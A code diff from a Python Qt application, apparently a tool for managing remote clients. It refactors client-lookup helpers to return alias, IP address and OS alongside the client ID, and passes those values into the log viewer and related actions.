@@ -78,29 +78,39 @@ class Actions:
         Set Alias For Client
         :return:
         '''
-        client = self.current_client()
+        client, alias, ip_address, os = self.current_client()
         if client:
             text, ok = QInputDialog.getText(self.moderat, _('ALIAS_SET'), _('ALIAS_NAME'))
             if ok:
                 self.moderat.moderator.send_msg('%s %s' % (client, str(text)), 'setAlias',
                                                 session_id=self.moderat.session_id)
 
-    def log_viewer(self):
-        client = self.current_client()
+    def log_viewer(self, tab):
+        if tab == 1:
+            client, alias, ip_address, os = self.current_offline_client()
+        elif tab == 2:
+            pass
+        else:
+            client, alias, ip_address, os = self.current_client()
         if client:
-            client_config = self.clients.get_client(client)
-            client_config['moderator'] = self.moderat.moderator
-            client_config['moderat'] = self.moderat
-            client_config['client'] = client
-            client_config['session_id'] = self.moderat.session_id
-            client_config['assets'] = self.moderat.assets
+            client_config = self.clients.get_client(client) if tab == 0 else {}
             module_id = id_generator()
-            client_config['module_id'] = module_id
+            client_config.update({
+                    'moderator':    self.moderat.moderator,
+                    'moderat':      self.moderat,
+                    'client':       client,
+                    'alias':        alias,
+                    'ip_address':   ip_address,
+                    'os':           os,
+                    'session_id':   self.moderat.session_id,
+                    'assets':       self.moderat.assets,
+                    'module_id':    module_id,
+            })
             self.moderat.logViewers[module_id] = LogViewer(client_config)
             self.moderat.logViewers[module_id].show()
 
     def set_log_settings(self):
-        client = self.current_client()
+        client, alias, ip_address, os = self.current_client()
         if client:
             client_config = self.clients.get_client(client)
             client_config['moderator'] = self.moderat.moderator
@@ -111,7 +121,7 @@ class Actions:
             self.log_settings.show()
 
     def update_source(self):
-        client = self.current_client()
+        client, alias, ip_address, os = self.current_client()
         if client:
             self.moderat.moderator.send_msg('updateSource', 'updateSource', session_id=self.moderat.session_id, _to=client, module_id='')
 
@@ -142,14 +152,24 @@ class Actions:
     # get online client
     def current_client(self):
         try:
-            return str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 3).text())
+            return (
+                str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 3).text()),
+                str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 2).text()),
+                str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 1).text()),
+                str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 4).text()),
+            )
         except AttributeError:
             return False
 
     # get offline client
     def current_offline_client(self):
         try:
-            return str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 2).text())
+            return (
+                str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 1).text()),
+                str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 2).text()),
+                str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 3).text()),
+                ''
+            )
         except AttributeError:
             return False
 
@@ -165,7 +185,7 @@ class Actions:
 
     # Administrators
     def administrator_set_moderator(self):
-        client = self.current_client()
+        client, alias, ip_address, os = self.current_client()
         if client:
             text, ok = QInputDialog.getText(self, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
             if ok:
